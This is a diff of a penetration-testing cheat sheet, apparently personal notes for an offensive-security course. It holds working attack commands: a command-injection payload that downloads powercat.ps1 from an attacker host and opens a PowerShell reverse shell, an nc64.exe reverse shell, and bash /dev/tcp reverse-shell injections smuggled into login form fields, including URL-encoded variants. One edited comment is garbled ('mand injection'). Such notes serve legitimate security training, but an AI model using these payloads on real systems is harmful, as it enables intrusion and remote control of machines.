@@ -80,7 +80,7 @@
      `sudo nano /etc/hosts`  
      192.168.126.13    intranet.local
    - Software and tech   
-     `whatweb http://<IP>`  
+     `whatweb -v http://<IP>`  
      `curl -I http://<IP>`  
    - Enum directory  
      `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t5`
@@ -162,7 +162,7 @@ Kali port:
       cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
       python3 -m http.server 80
 
-      #Target OS command injection
+      #Target mand injection
       curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
       ```
     - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
@@ -511,6 +511,12 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     ```
     `(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`          
     `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
+  - Url encode chrs
+    ```
+    "     %22
+    &     %26
+    space +
+    ```
   - 💣 Linux: Bash reverse shell  
     `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa="&&bash -c 'bash -i >& /dev/tcp/<kali>/4444 0>&1'""`  
     `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/<kali>/4444+0>%261'%22"`  
